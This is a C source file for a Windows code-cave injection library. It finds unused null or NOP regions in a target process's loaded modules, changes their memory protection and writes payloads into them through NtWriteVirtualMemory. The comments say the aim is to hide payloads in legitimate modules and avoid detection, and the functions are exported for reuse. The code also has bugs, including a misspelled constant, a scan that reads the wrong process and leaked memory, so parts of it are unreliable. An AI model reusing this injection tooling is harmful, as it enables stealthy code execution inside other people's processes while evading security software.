/**
 * Advanced Code Cave Injection - Fileless Execution Module
 * 
 * Features:
 * - Find unused memory regions (code caves) in loaded modules
 * - Inject payloads without calling VirtualAlloc (no detection)
 * - Hide payloads in legitimate module memory
 * - Support for multiple cave types: section gaps, NULL padding, NOP sleds
 * - Advanced evasion techniques and memory safety
 * 
 * MITRE: T1574 (Hijack Execution Flow)
 */

#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <psapi.h>
#include <tlhelp32.h>

// Code cave structure
typedef struct {
    LPVOID Address;
    SIZE_T Size;
    DWORD Protect;
    CHAR ModuleName[MAX_PATH];
    CHAR SectionName[IMAGE_SIZEOF_SHORT_NAME];
    BOOL IsExecutable;
    BOOL IsWritable;
} CODE_CAVE;

// Code cave search parameters
typedef struct {
    DWORD MinCaveSize;
    DWORD MaxCaveSize;
    BOOL SearchExecutableOnly;
    BOOL SearchWritableOnly;
    BOOL IncludeSystemModules;
    BOOL IncludeUserModules;
    DWORD MaxModulesToScan;
} CAVE_SEARCH_PARAMS;

// Function prototypes
BOOL FindCodeCaves(DWORD ProcessId, CODE_CAVE** ppCaves, DWORD* pCaveCount, CAVE_SEARCH_PARAMS* pParams);
BOOL InjectIntoCodeCave(DWORD ProcessId, CODE_CAVE* pCave, LPVOID pPayload, SIZE_T PayloadSize);
BOOL CleanupCodeCaveInjection(DWORD ProcessId, CODE_CAVE* pCave, LPVOID pOriginalBytes, SIZE_T OriginalSize);
CODE_CAVE* FindBestCodeCave(CODE_CAVE* pCaves, DWORD CaveCount, SIZE_T RequiredSize);

// Internal helper functions
static BOOL InternalEnumerateModules(DWORD ProcessId, HMODULE** ppModules, DWORD* pModuleCount);
static BOOL InternalFindCavesInModule(HMODULE hModule, DWORD ProcessId, CODE_CAVE** ppCaves, DWORD* pCaveCount, 
                                      CAVE_SEARCH_PARAMS* pParams, CHAR* ModuleName);
static BOOL InternalParseModuleSections(HMODULE hModule, DWORD ProcessId, CODE_CAVE** ppCaves, DWORD* pCaveCount,
                                        CAVE_SEARCH_PARAMS* pParams, CHAR* ModuleName);
static BOOL InternalScanMemoryForCaves(LPVOID StartAddress, SIZE_T RegionSize, DWORD Protect, 
                                       CODE_CAVE** ppCaves, DWORD* pCaveCount, CAVE_SEARCH_PARAMS* pParams,
                                       CHAR* ModuleName, CHAR* SectionName);
static BOOL InternalIsValidCave(LPBYTE pMemory, SIZE_T Size, DWORD MinCaveSize);
static BOOL InternalWriteProcessMemoryEx(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize);
static BOOL InternalReadProcessMemoryEx(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize);
static DWORD InternalGetPageProtection(DWORD Protect);

// Default search parameters
#define DEFAULT_MIN_CAVE_SIZE  1024    // 1KB minimum
#define DEFAULT_MAX_CAVE_SIZE  65536   // 64KB maximum
#define DEFAULT_MAX_MODULES    50      // Scan up to 50 modules

/**
 * FindCodeCaves - Search for code caves in target process
 * 
 * @param ProcessId        Target process ID
 * @param ppCaves          Pointer to receive array of found caves
 * @param pCaveCount       Pointer to receive number of found caves
 * @param pParams          Search parameters (NULL for defaults)
 * @return BOOL            TRUE on success, FALSE on failure
 */
BOOL FindCodeCaves(DWORD ProcessId, CODE_CAVE** ppCaves, DWORD* pCaveCount, CAVE_SEARCH_PARAMS* pParams) {
    if (!ppCaves || !pCaveCount) {
        return FALSE;
    }
    
    // Use default parameters if none provided
    CAVE_SEARCH_PARAMS defaultParams = {
        .MinCaveSize = DEFAULT_MIN_CAVE_SIZE,
        .MaxCaveSize = DEFAULT_MAX_CAVE_SIZE,
        .SearchExecutableOnly = TRUE,
        .SearchWritableOnly = FALSE,
        .IncludeSystemModules = TRUE,
        .IncludeUserModules = TRUE,
        .MaxModulesToScan = DEFAULT_MAX_MODULES
    };
    
    CAVE_SEARCH_PARAMS* searchParams = pParams ? pParams : &defaultParams;
    
    // Enumerate modules in target process
    HMODULE* pModules = NULL;
    DWORD moduleCount = 0;
    
    if (!InternalEnumerateModules(ProcessId, &pModules, &moduleCount)) {
        return FALSE;
    }
    
    // Limit number of modules to scan
    if (moduleCount > searchParams->MaxModulesToScan) {
        moduleCount = searchParams->MaxModulesToScan;
    }
    
    // Allocate initial cave array
    CODE_CAVE* pCaves = (CODE_CAVE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 
                                             sizeof(CODE_CAVE) * 100);
    if (!pCaves) {
        if (pModules) HeapFree(GetProcessHeap(), 0, pModules);
        return FALSE;
    }
    
    DWORD caveCount = 0;
    DWORD maxCaves = 100;
    
    // Scan each module for caves
    for (DWORD i = 0; i < moduleCount; i++) {
        CHAR moduleName[MAX_PATH] = {0};
        GetModuleFileNameExA(ProcessId == GetCurrentProcessId() ? 
                           GetCurrentProcess() : OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ProcessId),
                           pModules[i], moduleName, MAX_PATH);
        
        // Filter modules based on parameters
        BOOL shouldScan = TRUE;
        
        // Check if it's a system module
        if (strstr(moduleName, "\\Windows\\") || strstr(moduleName, "\\System32\\") || 
            strstr(moduleName, "\\SysWOW64\\")) {
            if (!searchParams->IncludeSystemModules) {
                shouldScan = FALSE;
            }
        } else {
            if (!searchParams->IncludeUserModules) {
                shouldScan = FALSE;
            }
        }
        
        if (shouldScan) {
            // Find caves in this module
            InternalFindCavesInModule(pModules[i], ProcessId, &pCaves, &caveCount, 
                                     searchParams, moduleName);
            
            // Resize array if needed
            if (caveCount >= maxCaves - 10) {
                maxCaves *= 2;
                CODE_CAVE* pNewCaves = (CODE_CAVE*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                                              pCaves, sizeof(CODE_CAVE) * maxCaves);
                if (!pNewCaves) {
                    HeapFree(GetProcessHeap(), 0, pCaves);
                    if (pModules) HeapFree(GetProcessHeap(), 0, pModules);
                    return FALSE;
                }
                pCaves = pNewCaves;
            }
        }
    }
    
    // Clean up
    if (pModules) {
        HeapFree(GetProcessHeap(), 0, pModules);
    }
    
    // Return results
    *ppCaves = pCaves;
    *pCaveCount = caveCount;
    
    return (caveCount > 0);
}

/**
 * InjectIntoCodeCave - Inject payload into found code cave
 * 
 * @param ProcessId        Target process ID
 * @param pCave            Code cave to inject into
 * @param pPayload         Payload data
 * @param PayloadSize      Size of payload
 * @return BOOL            TRUE on success, FALSE on failure
 */
BOOL InjectIntoCodeCave(DWORD ProcessId, CODE_CAVE* pCave, LPVOID pPayload, SIZE_T PayloadSize) {
    if (!pCave || !pPayload || PayloadSize == 0 || PayloadSize > pCave->Size) {
        return FALSE;
    }
    
    HANDLE hProcess = NULL;
    
    if (ProcessId == GetCurrentProcessId()) {
        hProcess = GetCurrentProcess();
    } else {
        // Open target process with necessary permissions
        hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                              FALSE, ProcessId);
        if (!hProcess) {
            return FALSE;
        }
    }
    
    // Save original bytes for cleanup
    LPBYTE pOriginalBytes = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PayloadSize);
    if (!pOriginalBytes) {
        if (hProcess != GetCurrentProcess()) CloseHandle(hProcess);
        return FALSE;
    }
    
    // Read original memory contents
    if (!InternalReadProcessMemoryEx(hProcess, pCave->Address, pOriginalBytes, PayloadSize)) {
        HeapFree(GetProcessHeap(), 0, pOriginalBytes);
        if (hProcess != GetCurrentProcess()) CloseHandle(hProcess);
        return FALSE;
    }
    
    // Change memory protection to writable if needed
    DWORD oldProtect = 0;
    if (!pCave->IsWritable) {
        if (!VirtualProtectEx(hProcess, pCave->Address, PayloadSize, 
                             PAGE_EXECUTE_READWRITE, &oldProtect)) {
            HeapFree(GetProcessHeap(), 0, pOriginalBytes);
            if (hProcess != GetCurrentProcess()) CloseHandle(hProcess);
            return FALSE;
        }
    }
    
    // Write payload to code cave
    BOOL success = InternalWriteProcessMemoryEx(hProcess, pCave->Address, pPayload, PayloadSize);
    
    // Restore original protection if changed
    if (!pCave->IsWritable && oldProtect != 0) {
        DWORD tempProtect = 0;
        VirtualProtectEx(hProcess, pCave->Address, PayloadSize, oldProtect, &tempProtect);
    }
    
    // Store original bytes in cave structure for later cleanup
    pCave->IsExecutable = TRUE;  // Mark as modified
    
    // Clean up
    if (hProcess != GetCurrentProcess()) {
        CloseHandle(hProcess);
    }
    
    // Store original bytes pointer (caller should manage this)
    // In a real implementation, you'd store this in a global map or similar
    
    return success;
}

/**
 * CleanupCodeCaveInjection - Restore original memory contents
 * 
 * @param ProcessId        Target process ID
 * @param pCave            Code cave to restore
 * @param pOriginalBytes   Original bytes saved during injection
 * @param OriginalSize     Size of original bytes
 * @return BOOL            TRUE on success, FALSE on failure
 */
BOOL CleanupCodeCaveInjection(DWORD ProcessId, CODE_CAVE* pCave, LPVOID pOriginalBytes, SIZE_T OriginalSize) {
    if (!pCave || !pOriginalBytes || OriginalSize == 0) {
        return FALSE;
    }
    
    HANDLE hProcess = NULL;
    
    if (ProcessId == GetCurrentProcessId()) {
        hProcess = GetCurrentProcess();
    } else {
        hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                              FALSE, ProcessId);
        if (!hProcess) {
            return FALSE;
        }
    }
    
    // Change protection to writable
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pCave->Address, OriginalSize,
                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
        if (hProcess != GetCurrentProcess()) CloseHandle(hProcess);
        return FALSE;
    }
    
    // Restore original bytes
    BOOL success = InternalWriteProcessMemoryEx(hProcess, pCave->Address, pOriginalBytes, OriginalSize);
    
    // Restore original protection
    DWORD tempProtect = 0;
    VirtualProtectEx(hProcess, pCave->Address, OriginalSize, oldProtect, &tempProtect);
    
    // Clean up
    if (hProcess != GetCurrentProcess()) {
        CloseHandle(hProcess);
    }
    
    return success;
}

/**
 * FindBestCodeCave - Select the best code cave for injection
 * 
 * @param pCaves          Array of found code caves
 * @param CaveCount       Number of caves in array
 * @param RequiredSize    Required payload size
 * @return CODE_CAVE*     Pointer to best cave, NULL if none suitable
 */
CODE_CAVE* FindBestCodeCave(CODE_CAVE* pCaves, DWORD CaveCount, SIZE_T RequiredSize) {
    if (!pCaves || CaveCount == 0 || RequiredSize == 0) {
        return NULL;
    }
    
    CODE_CAVE* pBestCave = NULL;
    DWORD bestScore = 0;
    
    for (DWORD i = 0; i < CaveCount; i++) {
        CODE_CAVE* pCave = &pCaves[i];
        
        // Skip if cave is too small
        if (pCave->Size < RequiredSize) {
            continue;
        }
        
        // Calculate score based on various factors
        DWORD score = 0;
        
        // 1. Size match (closer to required size is better)
        score += 1000 - (abs((LONG)pCave->Size - (LONG)RequiredSize) / 1024);
        
        // 2. Executable memory is better
        if (pCave->IsExecutable) {
            score += 500;
        }
        
        // 3. Writable memory is better (no protection change needed)
        if (pCave->IsWritable) {
            score += 300;
        }
        
        // 4. System modules are better (more trusted)
        if (strstr(pCave->ModuleName, "\\Windows\\") || 
            strstr(pCave->ModuleName, "\\System32\\")) {
            score += 200;
        }
        
        // 5. Larger caves are better (more space for payload)
        score += pCave->Size / 4096;
        
        // Update best cave if this one scores higher
        if (score > bestScore) {
            bestScore = score;
            pBestCave = pCave;
        }
    }
    
    return pBestCave;
}

// Internal helper functions implementation

static BOOL InternalEnumerateModules(DWORD ProcessId, HMODULE** ppModules, DWORD* pModuleCount) {
    HANDLE hProcess = NULL;
    
    if (ProcessId == GetCurrentProcessId()) {
        hProcess = GetCurrentProcess();
    } else {
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                              FALSE, ProcessId);
        if (!hProcess) {
            return FALSE;
        }
    }
    
    // First call to get required buffer size
    DWORD bytesNeeded = 0;
    if (!EnumProcessModules(hProcess, NULL, 0, &bytesNeeded)) {
        if (hProcess != GetCurrentProcess()) CloseHandle(hProcess);
        return FALSE;
    }
    
    DWORD moduleCount = bytesNeeded / sizeof(HMODULE);
    HMODULE* pModules = (HMODULE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytesNeeded);
    if (!pModules) {
        if (hProcess != GetCurrentProcess()) CloseHandle(hProcess);
        return FALSE;
    }
    
    // Second call to get module handles
    if (!EnumProcessModules(hProcess, pModules, bytesNeeded, &bytesNeeded)) {
        HeapFree(GetProcessHeap(), 0, pModules);
        if (hProcess != GetCurrentProcess()) CloseHandle(hProcess);
        return FALSE;
    }
    
    *ppModules = pModules;
    *pModuleCount = moduleCount;
    
    if (hProcess != GetCurrentProcess()) {
        CloseHandle(hProcess);
    }
    
    return TRUE;
}

static BOOL InternalFindCavesInModule(HMODULE hModule, DWORD ProcessId, CODE_CAVE** ppCaves, 
                                     DWORD* pCaveCount, CAVE_SEARCH_PARAMS* pParams, CHAR* ModuleName) {
    // Parse module sections for caves
    if (!InternalParseModuleSections(hModule, ProcessId, ppCaves, pCaveCount, pParams, ModuleName)) {
        return FALSE;
    }
    
    // Also scan the entire module memory for additional caves
    MODULEINFO moduleInfo = {0};
    HANDLE hProcess = ProcessId == GetCurrentProcessId() ? 
                     GetCurrentProcess() : 
                     OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ProcessId);
    
    if (hProcess && GetModuleInformation(hProcess, hModule, &moduleInfo, sizeof(moduleInfo))) {
        // Scan module memory for caves
        InternalScanMemoryForCaves(moduleInfo.lpBaseOfDll, moduleInfo.SizeOfImage,
                                  PAGE_EXECUTE_READ, ppCaves, pCaveCount, pParams,
                                  ModuleName, "Module");
    }
    
    if (hProcess != GetCurrentProcess()) {
        CloseHandle(hProcess);
    }
    
    return TRUE;
}

static BOOL InternalParseModuleSections(HMODULE hModule, DWORD ProcessId, CODE_CAVE** ppCaves,
                                       DWORD* pCaveCount, CAVE_SEARCH_PARAMS* pParams, CHAR* ModuleName) {
    // Read module headers from target process
    BYTE headers[0x1000] = {0};
    HANDLE hProcess = ProcessId == GetCurrentProcessId() ? 
                     GetCurrentProcess() : 
                     OpenProcess(PROCESS_VM_READ, FALSE, ProcessId);
    
    if (!hProcess) {
        return FALSE;
    }
    
    if (!ReadProcessMemory(hProcess, hModule, headers, sizeof(headers), NULL)) {
        if (hProcess != GetCurrentProcess()) CloseHandle(hProcess);
        return FALSE;
    }
    
    // Parse DOS header
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)headers;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        if (hProcess != GetCurrentProcess()) CloseHandle(hProcess);
        return FALSE;
    }
    
    // Parse NT headers
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(headers + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        if (hProcess != GetCurrentProcess()) CloseHandle(hProcess);
        return FALSE;
    }
    
    // Get section headers
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        CHAR sectionName[IMAGE_SIZIZEOF_SHORT_NAME + 1] = {0};
        memcpy(sectionName, pSection[i].Name, IMAGE_SIZEOF_SHORT_NAME);
        
        // Check section characteristics
        BOOL isExecutable = (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL isWritable = (pSection[i].Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
        BOOL isReadable = (pSection[i].Characteristics & IMAGE_SCN_MEM_READ) != 0;
        
        // Skip sections based on search parameters
        if (pParams->SearchExecutableOnly && !isExecutable) {
            continue;
        }
        if (pParams->SearchWritableOnly && !isWritable) {
            continue;
        }
        
        // Calculate section address and size
        LPVOID sectionAddress = (LPBYTE)hModule + pSection[i].VirtualAddress;
        SIZE_T sectionSize = pSection[i].Misc.VirtualSize;
        
        // Determine memory protection
        DWORD protect = 0;
        if (isExecutable) {
            if (isReadable) {
                if (isWritable) {
                    protect = PAGE_EXECUTE_READWRITE;
                } else {
                    protect = PAGE_EXECUTE_READ;
                }
            }
        } else {
            if (isReadable) {
                if (isWritable) {
                    protect = PAGE_READWRITE;
                } else {
                    protect = PAGE_READONLY;
                }
            }
        }
        
        // Scan this section for caves
        InternalScanMemoryForCaves(sectionAddress, sectionSize, protect,
                                  ppCaves, pCaveCount, pParams,
                                  ModuleName, sectionName);
    }
    
    if (hProcess != GetCurrentProcess()) {
        CloseHandle(hProcess);
    }
    
    return TRUE;
}

static BOOL InternalScanMemoryForCaves(LPVOID StartAddress, SIZE_T RegionSize, DWORD Protect,
                                      CODE_CAVE** ppCaves, DWORD* pCaveCount, CAVE_SEARCH_PARAMS* pParams,
                                      CHAR* ModuleName, CHAR* SectionName) {
    if (!StartAddress || RegionSize == 0 || !ppCaves || !pCaveCount || !pParams) {
        return FALSE;
    }
    
    HANDLE hProcess = GetCurrentProcess();
    LPBYTE pCurrent = (LPBYTE)StartAddress;
    SIZE_T remaining = RegionSize;
    
    // Allocate buffer for reading memory
    BYTE buffer[4096] = {0};
    
    while (remaining > 0) {
        SIZE_T toRead = (remaining < sizeof(buffer)) ? remaining : sizeof(buffer);
        
        // Read memory chunk
        if (!ReadProcessMemory(hProcess, pCurrent, buffer, toRead, NULL)) {
            // Can't read this region, skip to next
            pCurrent += toRead;
            remaining -= toRead;
            continue;
        }
        
        // Scan for caves in this chunk
        for (SIZE_T offset = 0; offset < toRead; offset++) {
            // Look for sequences of NULL bytes or NOPs (0x90)
            SIZE_T caveStart = offset;
            SIZE_T caveSize = 0;
            
            while (offset < toRead && (buffer[offset] == 0x00 || buffer[offset] == 0x90)) {
                caveSize++;
                offset++;
            }
            
            // Check if we found a valid cave
            if (caveSize >= pParams->MinCaveSize && caveSize <= pParams->MaxCaveSize) {
                if (InternalIsValidCave(&buffer[caveStart], caveSize, pParams->MinCaveSize)) {
                    // Add cave to array
                    if (*pCaveCount < 100) {  // Limit to prevent overflow
                        CODE_CAVE* pCave = &(*ppCaves)[*pCaveCount];
                        
                        pCave->Address = (LPVOID)(pCurrent + caveStart);
                        pCave->Size = caveSize;
                        pCave->Protect = Protect;
                        strncpy(pCave->ModuleName, ModuleName, MAX_PATH - 1);
                        strncpy(pCave->SectionName, SectionName, IMAGE_SIZEOF_SHORT_NAME - 1);
                        
                        // Determine memory permissions
                        pCave->IsExecutable = (Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | 
                                                         PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) != 0;
                        pCave->IsWritable = (Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE | 
                                                       PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) != 0;
                        
                        (*pCaveCount)++;
                    }
                }
            }
        }
        
        pCurrent += toRead;
        remaining -= toRead;
    }
    
    return TRUE;
}

static BOOL InternalIsValidCave(LPBYTE pMemory, SIZE_T Size, DWORD MinCaveSize) {
    if (!pMemory || Size < MinCaveSize) {
        return FALSE;
    }
    
    // Check for consecutive NULL bytes or NOPs
    DWORD consecutiveCount = 0;
    DWORD maxConsecutive = 0;
    
    for (SIZE_T i = 0; i < Size; i++) {
        if (pMemory[i] == 0x00 || pMemory[i] == 0x90) {
            consecutiveCount++;
            if (consecutiveCount > maxConsecutive) {
                maxConsecutive = consecutiveCount;
            }
        } else {
            consecutiveCount = 0;
        }
    }
    
    // Valid cave if we have a large enough consecutive block
    return (maxConsecutive >= MinCaveSize);
}

static BOOL InternalWriteProcessMemoryEx(HANDLE hProcess, LPVOID lpBaseAddress, 
                                        LPCVOID lpBuffer, SIZE_T nSize) {
    // Use NtWriteVirtualMemory for direct syscall if available
    // Fall back to WriteProcessMemory
    
    typedef NTSTATUS (NTAPI *PNtWriteVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        ULONG BufferLength,
        PULONG BytesWritten
    );
    
    static PNtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
    
    if (!pNtWriteVirtualMemory) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            pNtWriteVirtualMemory = (PNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
        }
    }
    
    if (pNtWriteVirtualMemory) {
        ULONG bytesWritten = 0;
        NTSTATUS status = pNtWriteVirtualMemory(hProcess, lpBaseAddress, (PVOID)lpBuffer, 
                                               (ULONG)nSize, &bytesWritten);
        return NT_SUCCESS(status) && (bytesWritten == nSize);
    }
    
    // Fallback to standard WriteProcessMemory
    SIZE_T bytesWritten = 0;
    return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, &bytesWritten) && 
           (bytesWritten == nSize);
}

static BOOL InternalReadProcessMemoryEx(HANDLE hProcess, LPCVOID lpBaseAddress,
                                       LPVOID lpBuffer, SIZE_T nSize) {
    // Use NtReadVirtualMemory for direct syscall if available
    // Fall back to ReadProcessMemory
    
    typedef NTSTATUS (NTAPI *PNtReadVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        ULONG BufferLength,
        PULONG BytesRead
    );
    
    static PNtReadVirtualMemory pNtReadVirtualMemory = NULL;
    
    if (!pNtReadVirtualMemory) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            pNtReadVirtualMemory = (PNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
        }
    }
    
    if (pNtReadVirtualMemory) {
        ULONG bytesRead = 0;
        NTSTATUS status = pNtReadVirtualMemory(hProcess, (PVOID)lpBaseAddress, lpBuffer,
                                              (ULONG)nSize, &bytesRead);
        return NT_SUCCESS(status) && (bytesRead == nSize);
    }
    
    // Fallback to standard ReadProcessMemory
    SIZE_T bytesRead = 0;
    return ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, &bytesRead) && 
           (bytesRead == nSize);
}

static DWORD InternalGetPageProtection(DWORD Protect) {
    // Convert Windows protection flags to readable string
    switch (Protect) {
        case PAGE_NOACCESS: return 0x01;
        case PAGE_READONLY: return 0x02;
        case PAGE_READWRITE: return 0x04;
        case PAGE_WRITECOPY: return 0x08;
        case PAGE_EXECUTE: return 0x10;
        case PAGE_EXECUTE_READ: return 0x20;
        case PAGE_EXECUTE_READWRITE: return 0x40;
        case PAGE_EXECUTE_WRITECOPY: return 0x80;
        default: return Protect;
    }
}

/**
 * Example usage function
 */
VOID ExampleCodeCaveUsage() {
    DWORD targetPid = GetCurrentProcessId();  // Use current process for example
    
    // Set up search parameters
    CAVE_SEARCH_PARAMS params = {
        .MinCaveSize = 2048,      // 2KB minimum
        .MaxCaveSize = 32768,     // 32KB maximum
        .SearchExecutableOnly = TRUE,
        .SearchWritableOnly = FALSE,
        .IncludeSystemModules = TRUE,
        .IncludeUserModules = TRUE,
        .MaxModulesToScan = 30
    };
    
    // Find code caves
    CODE_CAVE* pCaves = NULL;
    DWORD caveCount = 0;
    
    if (FindCodeCaves(targetPid, &pCaves, &caveCount, &params)) {
        printf("Found %d code caves\n", caveCount);
        
        // Display found caves
        for (DWORD i = 0; i < caveCount; i++) {
            printf("Cave %d:\n", i + 1);
            printf("  Address: 0x%p\n", pCaves[i].Address);
            printf("  Size: %zu bytes\n", pCaves[i].Size);
            printf("  Module: %s\n", pCaves[i].ModuleName);
            printf("  Section: %s\n", pCaves[i].SectionName);
            printf("  Executable: %s\n", pCaves[i].IsExecutable ? "Yes" : "No");
            printf("  Writable: %s\n", pCaves[i].IsWritable ? "Yes" : "No");
            printf("\n");
        }
        
        // Example payload
        BYTE examplePayload[] = {
            0x90, 0x90, 0x90, 0x90,  // NOP sled
            0xCC                     // INT 3 (breakpoint)
        };
        
        // Find best cave for our payload
        CODE_CAVE* pBestCave = FindBestCodeCave(pCaves, caveCount, sizeof(examplePayload));
        
        if (pBestCave) {
            printf("Best cave for injection:\n");
            printf("  Address: 0x%p\n", pBestCave->Address);
            printf("  Size: %zu bytes\n", pBestCave->Size);
            
            // Inject payload
            if (InjectIntoCodeCave(targetPid, pBestCave, examplePayload, sizeof(examplePayload))) {
                printf("Injection successful!\n");
                
                // Note: In a real scenario, you'd save pOriginalBytes for cleanup
                // and execute the injected code
            } else {
                printf("Injection failed\n");
            }
        }
        
        // Clean up
        if (pCaves) {
            HeapFree(GetProcessHeap(), 0, pCaves);
        }
    } else {
        printf("No code caves found\n");
    }
}

// Export functions for dynamic linking
#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) BOOL WINAPI CodeCave_Find(DWORD ProcessId, CODE_CAVE** ppCaves, DWORD* pCaveCount) {
    return FindCodeCaves(ProcessId, ppCaves, pCaveCount, NULL);
}

__declspec(dllexport) BOOL WINAPI CodeCave_Inject(DWORD ProcessId, CODE_CAVE* pCave, 
                                                 LPVOID pPayload, SIZE_T PayloadSize) {
    return InjectIntoCodeCave(ProcessId, pCave, pPayload, PayloadSize);
}

__declspec(dllexport) BOOL WINAPI CodeCave_Cleanup(DWORD ProcessId, CODE_CAVE* pCave,
                                                  LPVOID pOriginalBytes, SIZE_T OriginalSize) {
    return CleanupCodeCaveInjection(ProcessId, pCave, pOriginalBytes, OriginalSize);
}

__declspec(dllexport) CODE_CAVE* WINAPI CodeCave_FindBest(CODE_CAVE* pCaves, DWORD CaveCount,
                                                         SIZE_T RequiredSize) {
    return FindBestCodeCave(pCaves, CaveCount, RequiredSize);
}

#ifdef __cplusplus
}
#endif